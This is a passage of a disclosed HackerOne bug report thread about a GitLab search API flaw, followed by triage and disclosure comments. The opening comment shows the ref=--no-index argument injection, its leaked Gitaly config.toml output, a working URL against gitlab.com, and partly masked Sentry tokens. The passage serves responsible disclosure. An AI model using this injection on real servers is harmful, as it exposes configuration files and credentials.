class=\"s1\"\u003e\u0026#39;http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs\u0026amp;search=.\u0026amp;ref=--no-index\n\n[{\u0026quot;basename\u0026quot;:null,\u0026quot;data\u0026quot;:\u0026quot;VERSION\\u00001\\u0000Gitaly, version 1.53.2\\n\u0026quot;,\u0026quot;filename\u0026quot;:null,\u0026quot;id\u0026quot;:null,\u0026quot;ref\u0026quot;:\u0026quot;--no-index\u0026quot;,\u0026quot;startline\u0026quot;:0,\u0026quot;project_id\u0026quot;:4},{\u0026quot;basename\u0026quot;:null,\u0026quot;data\u0026quot;:\u0026quot;config.toml\\u00001\\u0000# Gitaly configuration file\\nconfig.toml\\u00002\\u0000# This file is managed by gitlab-ctl. Manual changes will be\\nconfig.toml\\u00003\\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\\nconfig.toml\\u00004\\u0000# and run:\\nconfig.toml\\u00005\\u0000# sudo gitlab-ctl reconfigure\\nconfig.toml\\u00006\\u0000\\nconfig.toml\\u00007\\u0000socket_path = \u0026#39;\u003c/span\u003e/var/opt/gitlab/gitaly/gitaly.socket\u003cspan class=\"s1\"\u003e\u0026#39;\\nconfig.toml\\u00008\\u0000bin_dir = \u0026#39;\u003c/span\u003e/opt/gitlab/embedded/bin\u003cspan class=\"s1\"\u003e\u0026#39;\\nconfig.toml\\u00009\\u0000\\n\u0026quot;,\u0026quot;filename\u0026quot;:null,\u0026quot;id\u0026quot;:null,\u0026quot;ref\u0026quot;:\u0026quot;--no-index\u0026quot;,\u0026quot;startline\u0026quot;:0,\u0026quot;project_id\u0026quot;:4}]\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m not sure if this will be fixed by one of the other reports I submitted, but \u003ccode\u003egitlab.com\u003c/code\u003e is still vulnerable, \u003ccode\u003econfig.toml\u003c/code\u003e doesn\u0026#39;t contain too much but in this case it does contain the \u003ccode\u003esentry.io\u003c/code\u003e api tokens:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003ehttps://gitlab.com/api/v4/projects/2009901/search?scope=blobs\u0026amp;search=a\u0026amp;ref=--no-index\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esentry_dsn = \u0026#39;https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16\nruby_sentry_dsn = \u0026#39;https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLet me know if you want me to submit another report or require any other information.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-15T06:57:30.899Z","updated_at":"2019-08-15T06:57:30.899Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5591858,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the further information. We were planning to add additional DSL validation for Gitaly on a future release, I'll investigate with the engineering team if such validation would have prevented this new finding, and in case it wouldn't I'l triage the report.","markdown_message":"\u003cp\u003eThanks for the further information. We were planning to add additional DSL validation for Gitaly on a future release, I\u0026#39;ll investigate with the engineering team if such validation would have prevented this new finding, and in case it wouldn\u0026#39;t I\u0026#39;l triage the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-16T15:20:24.980Z","updated_at":"2019-08-16T15:20:24.980Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5669838,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @vakzz, I forgot to mention; can you open a new report regarding this new finding for better tracking?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/vakzz\"\u003e@vakzz\u003c/a\u003e, I forgot to mention; can you open a new report regarding this new finding for better tracking?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-26T22:35:32.299Z","updated_at":"2019-08-26T22:35:32.299Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5669894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@hackerjuan sure thing","markdown_message":"\u003cp\u003e\u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e sure thing\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-26T22:57:49.083Z","updated_at":"2019-08-26T22:57:49.083Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6029414,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-14T04:10:39.185Z","updated_at":"2019-10-14T04:10:39.185Z","first_to_agree":true,"actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6553413,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@hackerjuan is this ok to be disclosed?\n\nCheers,\nWill","markdown_message":"\u003cp\u003e\u003ca href=\"/hackerjuan\"\u003e@hackerjuan\u003c/a\u003e is this ok to be disclosed?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nWill\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-15T22:40:00.208Z","updated_at":"2019-12-15T22:40:00.208Z","actor":{"username":"vakzz","cleared":true,"url":"/vakzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/047/304/e00a2bcb95ada0158d77c1cf9d4b0c17e41a3dae_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6583891,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-19T00:29:02.581Z","updated_at":"2019-12-19T00:29:02.581Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6583892,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-19T00:29:02.702Z","updated_at":"2019-12-19T00:29:02.702Z","actor":{"username":"no-longer-with-company","cleared":false,"url":"/no-longer-with-company","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/324/c6fb0a069a32f1e9f503089aa18807ad593549e0_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}